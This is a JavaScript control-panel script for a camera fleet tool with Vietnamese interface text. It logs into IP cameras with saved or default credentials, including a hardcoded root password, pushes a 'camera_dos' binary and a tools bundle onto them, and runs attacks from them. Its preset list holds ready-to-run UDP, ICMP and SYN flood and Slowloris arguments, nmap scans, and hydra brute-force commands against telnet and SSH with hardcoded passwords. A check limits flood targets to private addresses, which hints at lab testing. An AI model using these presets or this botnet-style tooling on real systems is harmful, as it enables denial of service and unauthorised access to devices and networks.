import { createClient } from './api.js';
import { isIPv4OrCIDRv4, isPrivateIPv4 } from './config.js';
import * as UI from './ui.js';

const $ = (sel) => document.querySelector(sel);

let client = null;
let cameraStatus = {};
let binaryResults = [];
let savedCredentials = [];

// -- button spam guard --
const _busy = {};
function guardBtn(key, btn) {
  if (_busy[key]) return false;
  _busy[key] = true;
  if (btn) btn.disabled = true;
  return true;
}
function releaseBtn(key, btn) {
  _busy[key] = false;
  if (btn) btn.disabled = false;
}

async function init() {
  client = await createClient();
  client.connectStream();
  client.onEvent(onEvent);

  UI.setupTheme();
  UI.setupSelectAll();
  UI.setupExecSelectAll();

  // scan
  $('#scan-btn').addEventListener('click', onScanStart);
  $('#scan-stop').addEventListener('click', onScanStop);

  // credential mode toggle
  document.querySelectorAll('input[name="cred-mode"]').forEach(r => {
    r.addEventListener('change', onCredModeChange);
  });

  // connect / disconnect
  $('#connect-btn').addEventListener('click', onConnect);
  $('#disconnect-btn').addEventListener('click', onDisconnectAll);

  // binary
  $('#check-btn').addEventListener('click', onCheckBinary);
  $('#deploy-all-btn').addEventListener('click', onDeployAll);
  $('#delete-all-btn').addEventListener('click', onDeleteAll);

  // exec
  $('#exec-btn').addEventListener('click', onExec);
  $('#exec-stop-btn').addEventListener('click', onExecStop);
  $('#exec-mode').addEventListener('change', onModeChange);
  onModeChange();

  // sidebar
  $('#sidebar-toggle').addEventListener('click', () => {
    $('#cmd-sidebar').classList.toggle('collapsed');
  });
  document.querySelectorAll('.cmd-item').forEach(el => {
    el.addEventListener('click', () => {
      const cmd = el.dataset.cmd;
      const mode = el.dataset.mode;
      if (mode) $('#exec-mode').value = mode;
      onModeChange();
      $('#exec-args').value = cmd;
      el.classList.add('copied');
      setTimeout(() => el.classList.remove('copied'), 1200);
    });
  });

  // credential DB
  $('#db-refresh').addEventListener('click', loadCredentials);
  $('#db-add').addEventListener('click', onAddCred);
  document.addEventListener('click', onTableClick);

  // log
  $('#log-clear').addEventListener('click', UI.clearLog);

  // initial data load
  loadCredentials();
  loadStatus();
}

// ---------------------------------------------------------------- events
function onEvent(msg) {
  if (msg.type === 'status' && msg.module === '_conn') {
    UI.updateConnChip(msg.state);
    return;
  }
  if (msg.type === 'log') {
    UI.appendLog(msg.module, msg.level, msg.text);
  }
  if (msg.type === 'result') {
    if (msg.module === 'scan_ip' && msg.data?.hosts) {
      UI.renderScanResults(msg.data.hosts);
    }
    if (msg.module === 'binary' && msg.data?.results) {
      binaryResults = msg.data.results;
      UI.renderBinaryStatus(binaryResults, cameraStatus);
    }
    if (msg.module === 'connect' && msg.data?.results) {
      loadStatus();
    }
    if (msg.module === 'deploy' && msg.data?.results) {
      releaseBtn('deploy', $('#deploy-all-btn'));
      releaseBtn('delete', $('#delete-all-btn'));
      onCheckBinary();
    }
  }
  if (msg.type === 'exec_monitor' && msg.data) {
    UI.updateMonitorPanel(msg.data);
  }
  if (msg.type === 'status' && msg.module === 'scan_ip') {
    if (msg.state === 'running') {
      $('#scan-btn').hidden = true;
      $('#scan-stop').hidden = false;
      UI.updateScanBadge('running', msg.summary);
    } else {
      $('#scan-btn').hidden = false;
      $('#scan-stop').hidden = true;
      UI.updateScanBadge('idle', msg.summary);
    }
  }
}

// ---------------------------------------------------------------- scan
async function onScanStart() {
  const btn = $('#scan-btn');
  if (!guardBtn('scan', btn)) return;
  const range = $('#scan-range').value.trim();
  if (!isIPv4OrCIDRv4(range)) {
    UI.appendLog('scan_ip', 'error', 'Dải IP không hợp lệ');
    releaseBtn('scan', btn);
    return;
  }
  try {
    await client.scanStart(range);
  } catch (e) {
    UI.appendLog('scan_ip', 'error', e.message || String(e));
  }
  releaseBtn('scan', btn);
}

async function onScanStop() {
  try { await client.scanStop(); } catch {}
}

// ---------------------------------------------------------------- cred mode
function onCredModeChange() {
  const mode = document.querySelector('input[name="cred-mode"]:checked')?.value;
  $('#shared-creds').hidden = mode !== 'shared';
  $('#individual-creds').hidden = mode !== 'individual';
  $('#saved-creds').hidden = mode !== 'saved';

  if (mode === 'individual') {
    const ips = UI.getSelectedIPs();
    if (ips.length === 0) {
      UI.appendLog('connect', 'warn', 'Chọn ít nhất 1 IP từ bảng quét trước');
    }
    UI.renderIndividualCreds(ips);
  }
}

// ---------------------------------------------------------------- connect
async function onConnect() {
  const btn = $('#connect-btn');
  if (!guardBtn('connect', btn)) return;
  const mode = document.querySelector('input[name="cred-mode"]:checked')?.value;
  const selectedIPs = UI.getSelectedIPs();
  let cameras = [];

  if (mode === 'shared') {
    const user = $('#shared-user').value.trim() || 'root';
    const pass = $('#shared-pass').value;
    if (selectedIPs.length === 0) {
      UI.appendLog('connect', 'warn', 'Chọn ít nhất 1 IP từ bảng quét');
      releaseBtn('connect', btn);
      return;
    }
    cameras = selectedIPs.map(ip => ({ ip, username: user, password: pass }));
  } else if (mode === 'individual') {
    cameras = UI.getIndividualCreds();
    if (cameras.length === 0) {
      UI.appendLog('connect', 'warn', 'Chưa có camera nào trong danh sách');
      releaseBtn('connect', btn);
      return;
    }
  } else if (mode === 'saved') {
    if (selectedIPs.length > 0) {
      cameras = selectedIPs.map(ip => {
        const saved = savedCredentials.find(c => c.ip === ip);
        return saved ? { ip, username: saved.username, password: saved.password }
                     : { ip, username: 'root', password: 'vnpt@123' };
      });
    } else {
      cameras = savedCredentials.map(c => ({ ip: c.ip, username: c.username, password: c.password }));
    }
    if (cameras.length === 0) {
      UI.appendLog('connect', 'warn', 'Database trống — thêm credentials trước');
      releaseBtn('connect', btn);
      return;
    }
  }

  UI.appendLog('connect', 'info', `Đang kết nối ${cameras.length} camera…`);
  try {
    await client.connect(cameras);
  } catch (e) {
    UI.appendLog('connect', 'error', e.message || String(e));
  }
  releaseBtn('connect', btn);
  loadStatus();
}

async function onDisconnectAll() {
  try {
    await client.disconnect();
    UI.appendLog('connect', 'info', 'Đã ngắt tất cả');
  } catch {}
  loadStatus();
}

// ---------------------------------------------------------------- binary
async function onCheckBinary() {
  const btn = $('#check-btn');
  if (!guardBtn('check', btn)) return;
  UI.appendLog('binary', 'info', 'Đang kiểm tra /tmp/camera_dos…');
  try {
    const r = await client.checkBinary();
    if (r.results) {
      binaryResults = r.results;
      UI.renderBinaryStatus(binaryResults, cameraStatus);
    }
  } catch (e) {
    UI.appendLog('binary', 'error', e.message || String(e));
  }
  releaseBtn('check', btn);
}

async function onDeployAll() {
  const btn = $('#deploy-all-btn');
  if (!guardBtn('deploy', btn)) return;
  const target = $('#deploy-target').value;
  if (target === 'camera_dos' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang deploy camera_dos…');
    try { await client.deploy(null, 'camera_dos'); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  if (target === 'camera-tools' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang deploy camera-tools (tar.gz)…');
    try { await client.deployTools(null); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  releaseBtn('deploy', btn);
  setTimeout(() => { releaseBtn('check', $('#check-btn')); onCheckBinary(); }, 2000);
}

async function onDeleteAll() {
  const btn = $('#delete-all-btn');
  if (!guardBtn('delete', btn)) return;
  const target = $('#deploy-target').value;
  const label = target === 'all' ? 'tất cả binary' : target;
  if (!confirm(`Xóa ${label} trên tất cả camera?`)) { releaseBtn('delete', btn); return; }
  if (target === 'camera_dos' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang xóa camera_dos…');
    try { await client.deleteBinary(null, 'camera_dos'); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  if (target === 'camera-tools' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang xóa camera-tools…');
    try { await client.deleteTools(null); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  releaseBtn('delete', btn);
  setTimeout(() => { releaseBtn('check', $('#check-btn')); onCheckBinary(); }, 1000);
}

// ---------------------------------------------------------------- exec
const PRESETS = {
  dos: [
    { label: 'UDP 100pps', args: '--udp-flood --udp-threads 1 --udp-rate 100 --udp-payload raw --udp-port 514' },
    { label: 'UDP max', args: '--udp-flood --udp-threads 9 --udp-rate 0 --udp-payload raw --udp-port 514' },
    { label: 'ICMP 100pps', args: '--icmp-flood --icmp-threads 2 --icmp-rate 100 --icmp-size 64' },
    { label: 'SYN flood', args: '--connections 500 --synflood --synflood-threads 20 --synflood-rate 0' },
    { label: 'Slowloris HTTP', args: '80 --connections 50 --dribble 5 --proto http' },
  ],
  recon: [
    { label: 'Ping sweep', args: '--timeout 30 fping -a -q -g 192.168.1.1 192.168.1.254' },
    { label: 'TCP scan', args: '--timeout 60 nmap -sT -Pn -n -p 22,23,80,443,554,8080 --max-retries 1 192.168.1.28' },
    { label: 'Top 100', args: '--timeout 120 nmap -sT -Pn -n --top-ports 100 --max-retries 1 192.168.1.28' },
    { label: 'UDP scan', args: '--timeout 60 nmap -sU -Pn -n -p 53,67,123,161,554,1900 --max-retries 1 192.168.1.28' },
    { label: 'Inspect', args: '--inspect' },
  ],
  brute: [
    { label: 'Telnet test', args: '--timeout 120 hydra -l root -p vnpt@123 -t 1 -w 5 telnet://192.168.1.28:23' },
    { label: 'SSH test', args: '--timeout 120 hydra -l root -p root -t 1 -w 5 ssh://192.168.1.28:22' },
    { label: 'SSH files', args: '--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 ssh://192.168.1.28:22' },
    { label: 'Telnet files', args: '--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 telnet://192.168.1.28:23' },
  ],
};

function onModeChange() {
  const mode = $('#exec-mode').value;
  const targetWrap = $('#exec-target-wrap');
  if (mode === 'dos') {
    targetWrap.hidden = false;
    $('#exec-args').placeholder = '--udp-flood --udp-threads 10 --udp-rate 0 --udp-port 514';
  } else {
    targetWrap.hidden = true;
    $('#exec-args').placeholder = mode === 'recon'
      ? '--timeout 60 nmap -sT -Pn -n -p 22,80,443 192.168.1.28'
      : '--timeout 120 hydra -l root -p vnpt@123 -t 1 telnet://192.168.1.28';
  }
  const bar = $('#exec-presets');
  bar.innerHTML = '';
  (PRESETS[mode] || []).forEach(p => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'preset-btn';
    btn.textContent = p.label;
    btn.addEventListener('click', () => { $('#exec-args').value = p.args; });
    bar.appendChild(btn);
  });
}

async function onExec() {
  const btn = $('#exec-btn');
  if (!guardBtn('exec', btn)) return;
  const mode = $('#exec-mode').value;
  const target = $('#exec-target').value.trim();
  const args = $('#exec-args').value.trim();

  if (mode === 'dos') {
    if (!target || !isPrivateIPv4(target)) {
      UI.appendLog('exec', 'error', 'IP mục tiêu không hợp lệ hoặc ngoài RFC1918');
      releaseBtn('exec', btn); return;
    }
  }
  if (!args) {
    UI.appendLog('exec', 'error', 'Chưa nhập tham số lệnh');
    releaseBtn('exec', btn); return;
  }

  const selectedIPs = UI.getSelectedExecIPs();
  const ips = selectedIPs.length > 0 ? selectedIPs : null;
  const label = ips ? `${ips.length} camera đã chọn` : 'tất cả camera';
  const modeLabel = mode === 'dos' ? 'camera_dos' : 'camera-tools';
  UI.appendLog('exec', 'warn', `Chạy ${modeLabel} trên ${label} → ${mode === 'dos' ? target + ' ' : ''}${args}`);
  try {
    const result = await client.exec(ips, target, args, mode);
    const failed = (result.results || []).filter(item => !item.ok);
    failed.forEach(item => UI.appendLog('exec', 'error', `${item.ip}: ${item.msg}`));
    if (result.accepted && (result.results || []).some(item => item.ok)) {
      UI.showMonitorPanel(true);
    }
  } catch (e) {
    UI.appendLog('exec', 'error', e.message || String(e));
  } finally {
    releaseBtn('exec', btn);
  }
}

async function onExecStop() {
  const btn = $('#exec-stop-btn');
  if (!guardBtn('execstop', btn)) return;
  const selectedIPs = UI.getSelectedExecIPs();
  const ips = selectedIPs.length > 0 ? selectedIPs : null;
  const label = ips ? `${ips.length} camera đã chọn` : 'tất cả';
  UI.appendLog('exec', 'info', `Dừng tất cả tiến trình trên ${label}…`);
  try { await client.execStop(ips); } catch {}
  UI.showMonitorPanel(false);
  releaseBtn('execstop', btn);
}

// ---------------------------------------------------------------- credentials DB
async function loadCredentials() {
  try {
    const r = await client.credentials();
    savedCredentials = r.credentials || [];
    UI.renderCredentials(savedCredentials);
  } catch {}
}

async function onAddCred() {
  const entry = UI.promptAddCred();
  if (!entry) return;
  try {
    await client.saveCred(entry);
    loadCredentials();
  } catch {}
}

// ---------------------------------------------------------------- table button clicks
function onTableClick(e) {
  const btn = e.target.closest('button');
  if (!btn || btn.disabled) return;

  if (btn.classList.contains('del-bin')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    client.deleteBinary([ip], 'camera_dos').then(() => onCheckBinary()).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('deploy-bin')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    client.deploy([ip], 'camera_dos').then(() => setTimeout(onCheckBinary, 2000)).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('del-tools')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    client.deleteTools([ip]).then(() => onCheckBinary()).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('deploy-tools')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    client.deployTools([ip]).then(() => setTimeout(onCheckBinary, 3000)).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('del-cred')) {
    const ip = btn.dataset.ip;
    if (confirm(`Xóa credential cho ${ip}?`)) {
      btn.disabled = true;
      client.deleteCred(ip).then(() => loadCredentials()).finally(() => { btn.disabled = false; });
    }
  }
}

// ---------------------------------------------------------------- status polling
async function loadStatus() {
  try {
    const r = await client.status();
    cameraStatus = r.cameras || {};
    UI.updateCamCount(r.connected_count || 0);
    UI.renderBinaryStatus(binaryResults, cameraStatus);
    UI.renderExecCameras(cameraStatus, binaryResults);
  } catch {}
}

// refresh status every 5s
setInterval(loadStatus, 5000);

init();
